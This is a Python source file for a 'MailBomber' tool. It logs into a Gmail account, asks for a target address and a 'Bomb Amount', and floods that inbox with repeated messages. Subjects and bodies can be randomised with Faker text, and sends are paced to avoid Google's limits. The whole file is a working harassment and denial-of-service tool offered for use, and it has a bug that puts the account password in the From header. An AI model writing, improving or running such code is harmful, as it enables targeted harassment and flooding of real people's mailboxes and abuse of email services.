import time
import datetime
import smtplib
import sys
import os
import re

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from faker import Faker
from termcolor import colored
from bug_logger import BugLogger

class MailBomber:

    def clr(self, letter, color):
        if color == 'g':
            color = 'green'
        if color == 'c':
            color = 'cyan'
        if color == 'y':
            color = 'yellow'
        if color == 'm':
            color = 'magenta'
        letter = colored(letter, color, attrs=['bold'])
        return letter

    def mail_maker(self, gmail_addr, gmail_pass, target_addr, subject, body):
        bug_logger = BugLogger()
        try:
            sender_addr   = gmail_pass
            receiver_addr = target_addr
            message = MIMEMultipart()
            message['From'] = sender_addr
            message['To']   = receiver_addr
            message['Subject'] = subject
            mail_content = body
            message.attach(MIMEText(mail_content, 'plain'))
            text = message.as_string()
            return text
        except:
            curdate = datetime.datetime.now()
            fldate  = curdate.strftime('%m-%Y')
            print('Please confirm and verify the gmail account settings on '+self.clr('conf/gmail_account.json','g'))
            print('Check out '+self.clr('log/'+fldate+'.bug.log','g')+' for more detail about this current event')
            bug_logger.bug_logger_proc('MB')

    def mail_bomber_proc(self):
        bug_logger = BugLogger()
        total_mail = 0
        counter    = 1
        try:
            fake_text = Faker(['it_IT', 'ja_JP', 'cs_CZ', 'de_DE', 'es_ES', 'hi_IN', 'hr_HR', 'ar_SA', 'el_GR', 'tr_TR'])
            fin_input = False
            mail_content = ''
            texts = ''

            open_json = open(str(os.getcwd())+"/conf/gmail_account.json","r")
            str_json  = open_json.read()
            arr_json  = re.split('; |, |\\n', str_json)
            get_gmailaddr = re.split('; |, |\"', str(arr_json[0]))
            get_gmailpass = re.split('; |, |\"', str(arr_json[1]))

            sender_address   = get_gmailaddr[1]
            sender_pass      = get_gmailpass[1]
            receiver_address = input(self.clr('Target E-Mail\t: ','c'))

            mail_subject = input(self.clr('Mail Subject\t: ','c'))
            mail_content += input(self.clr('Mail Content\t: ','c'))
            mail_content += '\n'

            while fin_input == False:
                mail_content += input('\t\t  ')
                if re.search('///', mail_content):
                    fin_input = True
                    continue
                mail_content += '\n'

            session = smtplib.SMTP('smtp.gmail.com', 587)
            session.starttls()
            session.login(sender_address, sender_pass)

            total_mail   = int(input(self.clr('Bomb Amount\t: ','c')))
            sub_loop     = int(total_mail/55)
            interval     = total_mail/55
            counter      = 1

            est_time = '{:.4f}'.format(float(((total_mail * 2.3) + 5.5) / 3600))
            texts = self.mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
            go_time = time.time()
            mail_delay = 0
            mail_passer_subj = mail_subject
            mail_passer_cont = mail_content
            print('\nEstimated processing time is around %s hours\n' % self.clr(est_time,'g'))
            print('[+] Processing  | ', end="", flush=True)
            for i in range(54):
                if mail_delay >= 75:
                    time.sleep(30)
                    mail_delay = 0
                if sub_loop < 1:
                    for j in range(1):
                        if mail_passer_subj == '//random':
                            mail_subject_2 = str(fake_text.text())[:25]
                            mail_subject = mail_subject_2
                            texts = self.mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
                        if re.search('//random', mail_passer_cont):
                            mail_content_2 = ''
                            for i in range(30):
                                mail_content_2 += fake_text.text()
                            mail_content = mail_content_2
                            texts = self.mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
                        if counter <= total_mail:
                            session.sendmail(sender_address, receiver_address, texts)
                            counter += 1
                            mail_delay += 1
                            time.sleep(0.1)
                else:
                    for j in range(sub_loop*2):
                        if mail_passer_subj == '//random':
                            mail_subject_2 = str(fake_text.text())[:25]
                            mail_subject = mail_subject_2
                            texts = self.mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
                        if re.search('//random', mail_passer_cont):
                            mail_content_2 = ''
                            for i in range(30):
                                mail_content_2 += fake_text.text()
                            mail_content = mail_content_2
                            texts = self.mail_maker(sender_address, sender_pass, receiver_address, mail_subject, mail_content)
                        if counter <= total_mail:
                            session.sendmail(sender_address, receiver_address, texts)
                            #print('mail sent : %s' % (counter))
                            counter += 1
                            mail_delay += 1
                            time.sleep(0.1)
                prog = ':'
                print(prog, end="", flush=True)
                time.sleep(0.1)

            print('\n[+] Finalizing  | ', end="", flush=True)
            for i in range(54):
                prog = ':'
                print(prog, end="", flush=True)
                time.sleep(0.06)
            print()
            session.quit()
            open_json.close()

            frmt_query = '{:.3f}'.format(time.time() - go_time)
            print('\n%s have been bombed successfully, %s out of %s' % (self.clr(receiver_address,'g'), self.clr((counter-1),'y'), self.clr(total_mail,'c')))
            print("Consider to take a break to avoid any refused or blocked connection from google smtp server")
            print('\n'+self.clr('Query finished successfully in','y')+' %s seconds ...' % (frmt_query))
        except:
            curdate = datetime.datetime.now()
            fldate  = curdate.strftime('%m-%Y')
            print('\n\nError have been occured at '+self.clr((counter-1),'y')+' out of '+self.clr(total_mail,'c')+' may due to the sending limitation rules or misconfiguration')
            print('Check out '+self.clr('log/'+fldate+'.bug.log','g')+' for more detail about this current event')
            bug_logger.bug_logger_proc('MB')
